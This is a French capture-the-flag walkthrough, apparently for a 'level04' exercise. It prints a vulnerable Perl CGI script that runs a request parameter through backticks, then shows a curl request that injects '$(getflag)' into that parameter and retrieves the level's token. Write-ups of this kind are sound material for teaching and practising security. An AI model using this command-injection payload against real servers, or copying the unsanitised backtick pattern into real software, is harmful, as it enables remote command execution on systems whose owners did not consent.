@@ -1,0 +1,41 @@
+-----------------------------------------------------------
+                          LEVEL04
+-----------------------------------------------------------
+
+1. On affiche le contenu du fichier perl level04.pl
+   --------------------------------------------------------
+   CMD : cat level04.pl
+   OUTPUT : #!/usr/bin/perl
+            # localhost:4747
+            use CGI qw{param};
+            print "Content-type: text/html\n\n";
+            sub x {
+            $y = $_[0];
+            print `echo $y 2>&1`;
+            x(param("x"));
+
+2. Le script perl permet d'afficher la valeur de premier
+   paramètre envoyé 
+   --------------------------------------------------------
+   CMD : curl 'localhost:4747?x=coucou'
+   OUTPUT : coucou
+
+3. On fetch le header pour vérifier qu'on travail bien avec
+   un server HTTP
+   --------------------------------------------------------
+   CMD : curl -I localhost:4747
+   OUTPUT : HTTP/1.1 200 OK
+            Date: Mon, 06 Feb 2023 15:35:26 GMT
+            Server: Apache/2.2.22 (Ubuntu)
+            Vary: Accept-Encoding
+            Content-Length: 1
+            Content-Type: text/html
+
+4. De fait, on peut envoyé un sous commande pour que le echo
+   du script affiche son contenu
+   --------------------------------------------------------
+   CMD : curl 'localhost:4747?x=$(getflag)
+   OUTPUT : Check flag.
+            Here is your token : ne2searoevaevoem4ov4ar8ap
+
+
